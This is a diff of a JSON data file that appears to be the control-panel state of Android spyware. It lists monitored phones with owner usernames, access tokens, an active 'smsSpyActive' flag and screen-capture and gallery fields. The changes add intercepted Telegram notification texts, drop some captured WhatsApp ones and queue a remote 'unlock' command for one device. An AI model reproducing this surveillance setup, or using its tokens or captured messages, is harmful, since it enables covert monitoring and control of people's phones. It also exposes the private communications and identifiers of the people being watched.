@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776769206934,
+    "lastSeen": 1776769224957,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776769206554,
+    "lastSeen": 1776769223245,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 18:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769226018
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5782 pesan baru dari 48 obrolan",
+        "time": "21/04 18:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769225933
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -13626,22 +13642,6 @@
         "time": "21/04 17:39",
         "pkg": "com.whatsapp",
         "receivedAt": 1776767999266
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 17:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767998441
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 17:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767997771
       }
     ],
     "galleryPhotos": [],
@@ -13660,8 +13660,14 @@
     "deviceName": "HP-BBBB-732D",
     "ownerUsername": "pian",
     "token": "06c7d23d86c7cc434c3d79ed0920fb91",
-    "lastSeen": 1776769207138,
-    "commandQueue": [],
+    "lastSeen": 1776769225085,
+    "commandQueue": [
+      {
+        "type": "unlock",
+        "payload": {},
+        "sentAt": 1776769225958
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-21T10:59:07.158Z",
     "deviceInfo": {
